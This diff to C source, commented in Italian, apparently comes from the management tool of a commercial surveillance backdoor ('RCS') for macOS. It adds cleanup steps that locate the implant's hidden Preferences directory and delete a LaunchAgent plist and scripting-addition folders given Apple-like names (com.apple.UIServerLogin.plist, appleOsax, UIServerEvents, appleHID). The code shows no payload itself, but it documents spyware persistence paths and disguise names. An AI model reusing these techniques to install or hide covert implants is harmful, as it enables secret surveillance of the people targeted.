@@ -102,6 +102,15 @@ BOOL SaveRootFile(HANDLE hfile, WCHAR *plist_path, os_struct_t *os_info, BOOL su
 
 void MAC_GetSourceFileDirectory(users_struct_t *user_info, rcs_struct_t *rcs_info, os_struct_t *os_info, WCHAR *src_path) 
 {
+	HANDLE hfile;
+
+	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
+	hfile = CreateFile(src_path, 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
+	if (hfile != INVALID_HANDLE_VALUE) {
+		CloseHandle(hfile);
+		return;
+	}
+	// Se non ha trovato il nome nuovo, cerca quello vecchio con .app
 	_snwprintf_s(src_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\Preferences\\%s.app", os_info->drive, SlashToBackSlash(user_info->user_home), rcs_info->hdir);
 }
 
@@ -200,6 +209,11 @@ BOOL MAC_RCSUnInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_stru
 	ClearAttributes(backdoor_path);
 	DeleteFile(backdoor_path);
 
+	// Cancella il plist della backdoor
+	_snwprintf_s(backdoor_path, MAX_PATH, _TRUNCATE, L"%s%s\\Library\\LaunchAgents\\com.apple.UIServerLogin.plist", os_info->drive, SlashToBackSlash(user_info->user_home));
+	ClearAttributes(backdoor_path);
+	DeleteFile(backdoor_path);
+
 	// Cancella tutti i file e la directory
 	MAC_GetSourceFileDirectory(user_info, rcs_info, os_info, backdoor_path);
 	DeleteDirectory(backdoor_path);
@@ -221,8 +235,11 @@ BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_str
 	if (installation_count == 0) {
 		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\appleOsax", os_info->drive);
 		DeleteDirectory(backdoor_path);
+		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\ScriptingAdditions\\UIServerEvents", os_info->drive);
+		DeleteDirectory(backdoor_path);
 		swprintf_s(backdoor_path, MAX_PATH, L"%sLibrary\\InputManagers\\appleHID", os_info->drive);
 		DeleteDirectory(backdoor_path);
 	}
+
 	return TRUE;
 }
